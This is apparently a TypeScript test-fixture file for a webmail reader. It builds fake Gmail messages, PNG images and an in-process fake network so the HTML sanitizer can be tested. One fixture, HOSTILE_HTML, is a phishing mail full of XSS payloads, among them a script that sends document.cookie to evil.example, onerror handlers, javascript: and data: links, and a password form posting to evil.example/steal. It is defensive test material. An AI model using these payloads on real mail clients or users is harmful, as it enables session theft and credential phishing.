/**
 * Test and demo support only (imported by *.test.ts and the verification
 * launcher, never by the server at runtime): realistic HTML mail for the
 * reader's original layout (SPEC-mail-html §8). Five messages as the fake
 * Gmail serves them:
 *
 *  - html-ithome: a table newsletter with <style>, @media, a remote logo,
 *    hero and thumbnails, a button, and two tracking pixels (1×1 and
 *    display:none on a list-manage host);
 *  - html-medium: a responsive digest with a CSS background image and avatars;
 *  - html-photo: a professor's reply with a cid: diagram, an image
 *    attachment and a PDF (multipart/related inside multipart/mixed);
 *  - html-wide: a fixed 720 px table (zoom-to-fit on a phone);
 *  - html-hostile: phishing-style HTML with every trick the sanitizer must
 *    stop (script, handlers, svg, iframe, form, meta refresh, base, CSS
 *    @import and escaped url(), a fixed overlay, javascript: and credential
 *    links, data:text/html and svg images…).
 *
 * Remote images live on `img.ithome.com.tw`, `cdn-images.medium-mail.com`
 * and `img.coolpc.com.tw`; `demoRemoteImage()` answers them for an injected
 * network (nothing here touches the real one).
 */
import { crc32, deflateSync } from "node:zlib";
import type { PublicNetwork, PublicResponse } from "../../../public-fetch.js";
import type { GmailPart } from "../parse.js";
import type { FakeMessageInput } from "../fake-gmail.js";

type Rgb = [number, number, number];

/** A truecolour PNG painted pixel by pixel (deterministic bytes for tests and the demo). */
export function pngImage(width: number, height: number, paint: (x: number, y: number) => Rgb): Buffer {
  const row = width * 3 + 1;
  const raw = Buffer.alloc(row * height);
  for (let y = 0; y < height; y++) {
    raw[y * row] = 0;
    for (let x = 0; x < width; x++) {
      const [r, g, b] = paint(x, y);
      raw.set([r, g, b], y * row + 1 + x * 3);
    }
  }
  const chunk = (type: string, data: Buffer) => {
    const length = Buffer.alloc(4);
    length.writeUInt32BE(data.length);
    const body = Buffer.concat([Buffer.from(type, "latin1"), data]);
    const crc = Buffer.alloc(4);
    crc.writeUInt32BE(crc32(body) >>> 0);
    return Buffer.concat([length, body, crc]);
  };
  const header = Buffer.alloc(13);
  header.writeUInt32BE(width, 0);
  header.writeUInt32BE(height, 4);
  header.set([8, 2, 0, 0, 0], 8);
  return Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), chunk("IHDR", header), chunk("IDAT", deflateSync(raw)), chunk("IEND", Buffer.alloc(0))]);
}

const mix = (a: Rgb, b: Rgb, t: number): Rgb => [0, 1, 2].map((index) => Math.round(a[index] + (b[index] - a[index]) * t)) as Rgb;

/** A banner: a diagonal gradient with soft circles, like a newsletter hero. */
export function bannerPng(width: number, height: number, from: Rgb, to: Rgb): Buffer {
  return pngImage(width, height, (x, y) => {
    const base = mix(from, to, (x / width + y / height) / 2);
    const circle = ((x - width * 0.75) ** 2 + (y - height * 0.45) ** 2) < (height * 0.32) ** 2;
    const ring = ((x - width * 0.18) ** 2 + (y - height * 0.7) ** 2) < (height * 0.2) ** 2;
    return circle ? mix(base, [255, 255, 255], 0.35) : ring ? mix(base, [255, 255, 255], 0.18) : base;
  });
}

/** A round avatar on white. */
export function avatarPng(size: number, color: Rgb): Buffer {
  return pngImage(size, size, (x, y) => (((x - size / 2) ** 2 + (y - size / 2) ** 2) < (size / 2 - 1) ** 2 ? color : [255, 255, 255]));
}

/** A simple box-and-arrow diagram (the professor's architecture sketch). */
export function diagramPng(): Buffer {
  const boxes: Array<[number, number, number, number, Rgb]> = [[30, 40, 150, 90, [79, 111, 149]], [230, 40, 350, 90, [47, 115, 80]], [430, 40, 550, 90, [164, 83, 44]], [230, 150, 350, 200, [111, 88, 160]]];
  return pngImage(580, 240, (x, y) => {
    for (const [x1, y1, x2, y2, color] of boxes) {
      const edge = (x === x1 || x === x2 || y === y1 || y === y2) && x >= x1 && x <= x2 && y >= y1 && y <= y2;
      if (edge) return color;
      if (x > x1 && x < x2 && y > y1 && y < y2) return mix(color, [255, 255, 255], 0.82);
    }
    if ((y === 65 && ((x > 150 && x < 230) || (x > 350 && x < 430))) || (x === 290 && y > 90 && y < 150)) return [90, 86, 76];
    return [255, 255, 255];
  });
}

/** A photo-like whiteboard shot (an image attachment). */
export function whiteboardPng(): Buffer {
  return pngImage(480, 320, (x, y) => {
    const line = (y % 40 === 0 && x > 40 && x < 440) || (Math.abs(y - (0.4 * x + 60)) < 2 && x > 60 && x < 400);
    return line ? [40, 70, 140] : mix([236, 238, 240], [214, 218, 224], y / 320);
  });
}

/** A 1×1 GIF (a tracking pixel served from an innocent-looking path). */
export const PIXEL_GIF = Buffer.from("R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==", "base64");

/** The demo hosts' images: undefined for anything else (a 404). */
export function demoRemoteImage(url: URL): { body: Buffer; type: string } | undefined {
  const png = (body: Buffer) => ({ body, type: "image/png" });
  const key = `${url.hostname}${url.pathname}`;
  switch (key) {
    case "img.ithome.com.tw/newsletter/logo.png": return png(pngImage(160, 48, (x, y) => (x < 48 ? [11, 99, 206] : y > 18 && y < 30 && x < 150 ? [29, 43, 58] : [255, 255, 255])));
    case "img.ithome.com.tw/newsletter/2026/hero.png": return png(bannerPng(600, 240, [11, 99, 206], [38, 166, 154]));
    case "img.ithome.com.tw/newsletter/2026/t1.png": return png(bannerPng(120, 80, [91, 63, 168], [11, 99, 206]));
    case "img.ithome.com.tw/newsletter/2026/t2.png": return png(bannerPng(120, 80, [205, 92, 52], [240, 170, 60]));
    case "img.ithome.com.tw/newsletter/2026/t3.png": return png(bannerPng(120, 80, [38, 120, 90], [120, 190, 120]));
    case "img.ithome.com.tw/newsletter/spacer.gif": return { body: PIXEL_GIF, type: "image/gif" };
    case "cdn-images.medium-mail.com/header.png": return png(bannerPng(640, 160, [24, 24, 24], [70, 70, 70]));
    case "cdn-images.medium-mail.com/avatar-1.png": return png(avatarPng(48, [222, 120, 80]));
    case "cdn-images.medium-mail.com/avatar-2.png": return png(avatarPng(48, [80, 140, 220]));
    case "cdn-images.medium-mail.com/avatar-3.png": return png(avatarPng(48, [90, 170, 120]));
    case "img.coolpc.com.tw/edm/2026-11/banner.png": return png(bannerPng(720, 200, [196, 30, 58], [250, 140, 30]));
    case "img.coolpc.com.tw/edm/2026-11/p1.png": return png(bannerPng(220, 160, [40, 40, 48], [110, 110, 130]));
    case "img.coolpc.com.tw/edm/2026-11/p2.png": return png(bannerPng(220, 160, [20, 60, 120], [60, 140, 220]));
    case "img.coolpc.com.tw/edm/2026-11/p3.png": return png(bannerPng(220, 160, [30, 90, 60], [90, 180, 110]));
    default: return undefined;
  }
}

/* ------------------------------------------------------------------ MIME */

const b64 = (data: string | Buffer) => (typeof data === "string" ? Buffer.from(data, "utf8") : data).toString("base64url");

function textPart(mimeType: "text/plain" | "text/html", text: string): GmailPart {
  return { mimeType, headers: [{ name: "Content-Type", value: `${mimeType}; charset=UTF-8` }], body: { size: Buffer.byteLength(text), data: b64(text) } };
}

function alternative(text: string, html: string): GmailPart {
  return { mimeType: "multipart/alternative", parts: [textPart("text/plain", text), textPart("text/html", html)] };
}

function imagePart(mimeType: string, bytes: Buffer, options: { filename: string; contentId?: string; disposition: "inline" | "attachment" }): GmailPart {
  return {
    mimeType,
    filename: options.filename,
    headers: [
      { name: "Content-Type", value: `${mimeType}; name="${options.filename}"` },
      { name: "Content-Disposition", value: `${options.disposition}; filename="${options.filename}"` },
      ...(options.contentId ? [{ name: "Content-ID", value: `<${options.contentId}>` }] : []),
    ],
    body: { size: bytes.length, data: bytes.toString("base64url") },
  };
}

/* ------------------------------------------------------------------ messages */

export const ITHOME_HTML = `<!doctype html><html lang="zh-Hant"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>iThome 電子報</title>
<style>
  body{margin:0;background:#f2f4f7;font-family:"Helvetica Neue",Arial,"PingFang TC","Microsoft JhengHei",sans-serif}
  .card{max-width:600px;margin:0 auto;background:#ffffff}
  .hero img{display:block;width:100%;height:auto}
  h1{font-size:22px;line-height:1.4;color:#1d2b3a;margin:0 0 8px}
  .item td{padding:14px 24px;border-bottom:1px solid #e5e8ec;vertical-align:top}
  .item a{color:#1d2b3a;text-decoration:none;font-weight:bold;font-size:16px}
  .item p{margin:4px 0 0;color:#5b6573;font-size:14px;line-height:1.6}
  .btn{display:inline-block;background:#0b63ce;color:#ffffff !important;text-decoration:none;padding:11px 20px;border-radius:4px;font-weight:bold}
  @media only screen and (max-width:480px){ .item .thumb{display:none !important} h1{font-size:19px !important} }
</style></head>
<body>
<table role="presentation" width="100%" cellpadding="0" cellspacing="0" bgcolor="#f2f4f7"><tr><td align="center" style="padding:24px 12px">
<table class="card" width="600" cellpadding="0" cellspacing="0" style="max-width:600px;width:100%">
<tr><td style="padding:16px 24px;border-bottom:3px solid #0b63ce"><img src="https://img.ithome.com.tw/newsletter/logo.png" width="160" height="48" alt="iThome 電子報"></td></tr>
<tr><td class="hero"><img src="https://img.ithome.com.tw/newsletter/2026/hero.png" width="600" height="240" alt="零信任架構實戰"></td></tr>
<tr><td style="padding:22px 24px 10px"><h1>本週資安焦點：零信任架構實戰</h1><p style="margin:0;color:#4a5563;line-height:1.7;font-size:15px">從身分驗證、裝置信任到微分段，三家企業分享導入零信任的第一年。</p></td></tr>
<tr class="item"><td><table width="100%" cellpadding="0" cellspacing="0"><tr><td class="thumb" width="120" style="padding:0 16px 0 0"><img src="https://img.ithome.com.tw/newsletter/2026/t1.png" width="120" height="80" alt=""></td><td><a href="https://www.ithome.com.tw/news/171234">供應鏈攻擊再升級：開源套件維護者帳號成為新目標</a><p>研究人員發現攻擊者鎖定低活躍度套件的維護者，透過釣魚取得發布權限。</p></td></tr></table></td></tr>
<tr class="item"><td><table width="100%" cellpadding="0" cellspacing="0"><tr><td class="thumb" width="120" style="padding:0 16px 0 0"><img src="https://img.ithome.com.tw/newsletter/2026/t2.png" width="120" height="80" alt=""></td><td><a href="https://www.ithome.com.tw/news/171240">Windows 管理員保護正式推出，UAC 提示將大幅減少</a><p>新的管理員保護以臨時帳號執行提權動作，降低憑證竊取風險。</p></td></tr></table></td></tr>
<tr class="item"><td><table width="100%" cellpadding="0" cellspacing="0"><tr><td class="thumb" width="120" style="padding:0 16px 0 0"><img src="https://img.ithome.com.tw/newsletter/2026/t3.png" width="120" height="80" alt=""></td><td><a href="https://www.ithome.com.tw/news/171251">CTF 新手村：從 pwn 到 web 的第一個月</a><p>學生資安社團整理的入門路線圖，附上練習平台與題目清單。</p></td></tr></table></td></tr>
<tr><td align="center" style="padding:26px 24px"><a class="btn" href="https://www.ithome.com.tw/security">閱讀更多資安新聞</a></td></tr>
<tr><td style="padding:16px 24px;font-size:12px;line-height:1.6;color:#8a94a3;background:#f7f8fa">你收到這封信是因為訂閱了 iThome 電子報。<a href="https://www.ithome.com.tw/unsubscribe?u=8f2c" style="color:#8a94a3">取消訂閱</a><img src="https://img.ithome.com.tw/newsletter/spacer.gif" alt=""></td></tr>
</table></td></tr></table>
<img src="https://ithome.us21.list-manage.com/track/open.php?u=1a2b&amp;id=3c4d" width="1" height="1" alt="">
<img src="https://news.ithome.com.tw/o/eJxVjU1.gif" style="display:none" alt="">
</body></html>`;

export const MEDIUM_HTML = `<html><head><style>
  .shell{max-width:640px;margin:0 auto;font-family:Georgia,"Times New Roman",serif;color:#242424}
  .head{height:160px;background:#242424 url(https://cdn-images.medium-mail.com/header.png) center/cover no-repeat;color:#fff;padding:28px;box-sizing:border-box}
  .head h2{margin:0;font-size:28px;font-weight:normal}
  .story{display:flex;gap:14px;padding:18px 0;border-bottom:1px solid #eee}
  .story img{border-radius:50%}
  .story h3{margin:0 0 6px;font-size:18px}
  .story h3 a{color:#242424;text-decoration:none}
  .meta{font-family:-apple-system,"Segoe UI",sans-serif;font-size:13px;color:#6b6b6b}
</style></head><body><div class="shell">
<div class="head"><h2>Today's highlights</h2><p class="meta" style="color:#ddd">Stories picked for Suzu</p></div>
<div class="story"><img src="https://cdn-images.medium-mail.com/avatar-1.png" width="48" height="48" alt="Mira"><div><h3><a href="https://medium.com/@mira/rust-async-scheduler">How I built a tiny scheduler in Rust</a></h3><p class="meta">Mira Chen · 7 min read</p></div></div>
<div class="story"><img src="https://cdn-images.medium-mail.com/avatar-2.png" width="48" height="48" alt="Ken"><div><h3><a href="https://medium.com/@ken/ebpf-latency">Measuring scheduler latency with eBPF</a></h3><p class="meta">Ken Wu · 11 min read</p></div></div>
<div class="story"><img src="https://cdn-images.medium-mail.com/avatar-3.png" width="48" height="48" alt="Ana"><div><h3><a href="https://medium.com/@ana/zero-trust-home-lab">A zero-trust home lab on a budget</a></h3><p class="meta">Ana Lin · 5 min read</p></div></div>
<p class="meta" style="padding:18px 0">Sent by Medium · <a href="https://medium.com/me/settings/notifications">Unsubscribe</a></p>
<img src="https://medium.com/_/stat?event=email.opened&amp;id=abc" width="1" height="1" alt="">
</div></body></html>`;

export const PHOTO_HTML = `<div dir="ltr" style="font-family:Arial,sans-serif;font-size:14px">同學好，<br><br>
架構圖我畫在下面，請照這個分層寫進提案的第二節：<br><br>
<img src="cid:arch-diagram@cs.nycu.edu.tw" width="580" height="240" alt="架構圖" style="border:1px solid #ddd"><br><br>
白板的照片也附上了，週三 meeting 再討論細節。<br><br>
<div class="gmail_signature">林志明<br>國立陽明交通大學 資訊工程學系</div>
<blockquote class="gmail_quote" style="margin:0 0 0 .8ex;border-left:1px solid #ccc;padding-left:1ex">老師好，附上期末專題的提案初稿…</blockquote></div>`;

export const WIDE_HTML = `<html><body style="margin:0;background:#fafafa">
<table width="720" align="center" cellpadding="0" cellspacing="0" style="width:720px;font-family:Arial,'Microsoft JhengHei',sans-serif;background:#ffffff">
<tr><td colspan="3"><img src="https://img.coolpc.com.tw/edm/2026-11/banner.png" width="720" height="200" alt="原價屋 11 月特價"></td></tr>
<tr>
<td width="240" align="center" style="padding:16px"><img src="https://img.coolpc.com.tw/edm/2026-11/p1.png" width="220" height="160" alt=""><p style="font-size:15px;margin:8px 0 2px"><b>RTX 5070 顯示卡</b></p><p style="color:#c41e3a;font-size:18px;margin:0">NT$18,990</p></td>
<td width="240" align="center" style="padding:16px"><img src="https://img.coolpc.com.tw/edm/2026-11/p2.png" width="220" height="160" alt=""><p style="font-size:15px;margin:8px 0 2px"><b>2TB NVMe SSD</b></p><p style="color:#c41e3a;font-size:18px;margin:0">NT$3,290</p></td>
<td width="240" align="center" style="padding:16px"><img src="https://img.coolpc.com.tw/edm/2026-11/p3.png" width="220" height="160" alt=""><p style="font-size:15px;margin:8px 0 2px"><b>機械鍵盤（茶軸）</b></p><p style="color:#c41e3a;font-size:18px;margin:0">NT$1,590</p></td>
</tr>
<tr><td colspan="3" align="center" style="padding:14px;font-size:12px;color:#888">原價屋 光華店 · <a href="https://www.coolpc.com.tw/evaluate.php">線上估價</a></td></tr>
</table></body></html>`;

/** Every trick in one mail: none of it may run, fetch, submit, navigate or overlay. */
export const HOSTILE_HTML = `<html><head>
<meta http-equiv="refresh" content="0;url=https://evil.example/phish">
<base href="https://evil.example/">
<link rel="stylesheet" href="https://evil.example/x.css">
<script>parent.location='https://evil.example/'+document.cookie</script>
<style>@import url("https://evil.example/import.css"); /* @import "https://evil.example/in-comment.css"; */
.warn{background:u\\72l(https://evil.example/escaped.png)} .ok{color:#b00020;font-weight:bold}
@font-face{font-family:x;src:url(https://evil.example/font.woff)}
.overlay{position:fixed;inset:0;background:#fff;z-index:99999}
</style></head>
<body onload="alert(1)">
<div class="overlay"><p>請重新登入你的 Google 帳號</p></div>
<p class="ok">你的帳號已被停用，請在 24 小時內驗證身分。</p>
<p>點這裡驗證：<a href="javascript:alert(document.domain)">立即驗證</a> · <a href="https://accounts.google.com@evil.example/login">accounts.google.com</a> · <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">安全中心</a></p>
<img src=x onerror="alert(1)"><img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+" alt="svg">
<svg><style><img src=x onerror=alert(1)></style><script>alert(2)</script></svg>
<math><mi xlink:href="javascript:alert(3)">x</mi></math>
<noscript><p title="</noscript><img src=x onerror=alert(4)>"></noscript>
<iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/o.swf"></object><embed src="https://evil.example/e.swf">
<form action="https://evil.example/steal" method="post"><input type="password" name="pw" placeholder="密碼"><button formaction="https://evil.example/b">送出</button></form>
<a href="https://evil.example/ping" ping="https://evil.example/track">追蹤連結</a>
<div style="background-image:url('https://evil.example/bg.png');width:100vh;behavior:url(x.htc);-moz-binding:url(x.xml#x)">樣式攻擊</div>
<img srcset="https://evil.example/a.png 1x, https://evil.example/b.png 2x" alt="srcset">
<table background="javascript:alert(5)"><tr><td>表格</td></tr></table>
<p>— 帳號安全小組</p>
</body></html>`;

/** The five demo messages, received in the hours before `now`. */
export function htmlMailFixtures(now: Date): FakeMessageInput[] {
  const ago = (hours: number) => new Date(now.getTime() - hours * 3_600_000).toISOString();
  return [
    {
      id: "html-ithome", from: "iThome 電子報 <newsletter@ithome.com.tw>", subject: "本週資安焦點：零信任架構實戰", at: ago(1.5),
      labels: ["INBOX", "UNREAD", "CATEGORY_UPDATES"], snippet: "從身分驗證、裝置信任到微分段，三家企業分享導入零信任的第一年。",
      headers: { "List-Unsubscribe": "<https://www.ithome.com.tw/unsubscribe?u=8f2c>" },
      payload: alternative("本週資安焦點：零信任架構實戰\n\n從身分驗證、裝置信任到微分段，三家企業分享導入零信任的第一年。\n\n1. 供應鏈攻擊再升級\n2. Windows 管理員保護正式推出\n3. CTF 新手村", ITHOME_HTML),
    },
    {
      id: "html-medium", from: "Medium Daily Digest <noreply@medium.com>", subject: "Today's highlights: a tiny scheduler in Rust", at: ago(3),
      labels: ["INBOX", "CATEGORY_UPDATES"], snippet: "How I built a tiny scheduler in Rust · Measuring scheduler latency with eBPF",
      headers: { "List-Unsubscribe": "<https://medium.com/me/settings/notifications>" },
      payload: alternative("Today's highlights\n\nHow I built a tiny scheduler in Rust — Mira Chen\nMeasuring scheduler latency with eBPF — Ken Wu", MEDIUM_HTML),
    },
    {
      id: "html-photo", from: "林志明 教授 <cmlin@cs.nycu.edu.tw>", subject: "Re: OS 期末專題：架構圖", at: ago(0.5),
      labels: ["INBOX", "UNREAD", "IMPORTANT", "CATEGORY_PERSONAL"], snippet: "架構圖我畫在下面，請照這個分層寫進提案的第二節…",
      payload: {
        mimeType: "multipart/mixed",
        parts: [
          {
            mimeType: "multipart/related",
            parts: [
              alternative("同學好，\n\n架構圖我畫在下面，請照這個分層寫進提案的第二節。\n白板的照片也附上了，週三 meeting 再討論細節。\n\n林志明", PHOTO_HTML),
              imagePart("image/png", diagramPng(), { filename: "architecture.png", contentId: "arch-diagram@cs.nycu.edu.tw", disposition: "inline" }),
            ],
          },
          imagePart("image/png", whiteboardPng(), { filename: "白板照片.png", disposition: "attachment" }),
          { mimeType: "application/pdf", filename: "proposal-v2.pdf", headers: [{ name: "Content-Disposition", value: "attachment; filename=\"proposal-v2.pdf\"" }], body: { size: 13, data: b64("%PDF-1.4\n%%EOF") } },
        ],
      },
    },
    {
      id: "html-wide", from: "原價屋 <edm@coolpc.com.tw>", subject: "11 月特價：顯示卡、SSD 與鍵盤", at: ago(6),
      labels: ["INBOX", "CATEGORY_PROMOTIONS"], snippet: "RTX 5070 顯示卡 NT$18,990 · 2TB NVMe SSD NT$3,290",
      headers: { "List-Unsubscribe": "<mailto:unsubscribe@coolpc.com.tw>" },
      payload: alternative("原價屋 11 月特價\nRTX 5070 顯示卡 NT$18,990\n2TB NVMe SSD NT$3,290\n機械鍵盤（茶軸）NT$1,590", WIDE_HTML),
    },
    {
      id: "html-hostile", from: "Google 帳號小組 <no-reply@accounts-google.support>", subject: "[重要] 你的帳號已被停用", at: ago(2),
      labels: ["INBOX", "UNREAD"], snippet: "你的帳號已被停用，請在 24 小時內驗證身分。",
      payload: alternative("你的帳號已被停用，請在 24 小時內驗證身分。", HOSTILE_HTML),
    },
  ];
}

/** What a test or the launcher's fake internet answers for one URL. */
export type RemoteAnswer = { status: number; body?: Buffer; headers?: Record<string, string> };

/**
 * A public network that never leaves the process: every name resolves to a
 * public documentation-free address (93.184.216.34) unless `addresses` says
 * otherwise, and URLs are answered by `answer` (default: the demo images, else
 * 404). `requests` records each request (the pinned address and the URL).
 */
export function demoPublicNetwork(options: {
  addresses?: Record<string, string[]>;
  answer?: (url: URL) => RemoteAnswer | undefined;
} = {}): PublicNetwork & { requests: Array<{ address: string; url: string; headers: Record<string, string> }>; lookups: string[] } {
  const requests: Array<{ address: string; url: string; headers: Record<string, string> }> = [];
  const lookups: string[] = [];
  return {
    requests,
    lookups,
    lookup: async (hostname) => {
      lookups.push(hostname);
      const listed = options.addresses?.[hostname];
      return (listed ?? ["93.184.216.34"]).map((address) => ({ address, family: address.includes(":") ? 6 as const : 4 as const }));
    },
    request: async (target, init): Promise<PublicResponse> => {
      requests.push({ address: target.address, url: target.url.href, headers: init.headers });
      const custom = options.answer?.(target.url);
      const demo = custom ? undefined : demoRemoteImage(target.url);
      const answer: RemoteAnswer = custom ?? (demo ? { status: 200, body: demo.body, headers: { "content-type": demo.type } } : { status: 404 });
      const body = answer.body ?? Buffer.alloc(0);
      return {
        status: answer.status,
        headers: { "content-length": String(body.length), ...answer.headers },
        body: (async function* () { if (body.length) yield body; })(),
        cancel: () => {},
      };
    },
  };
}
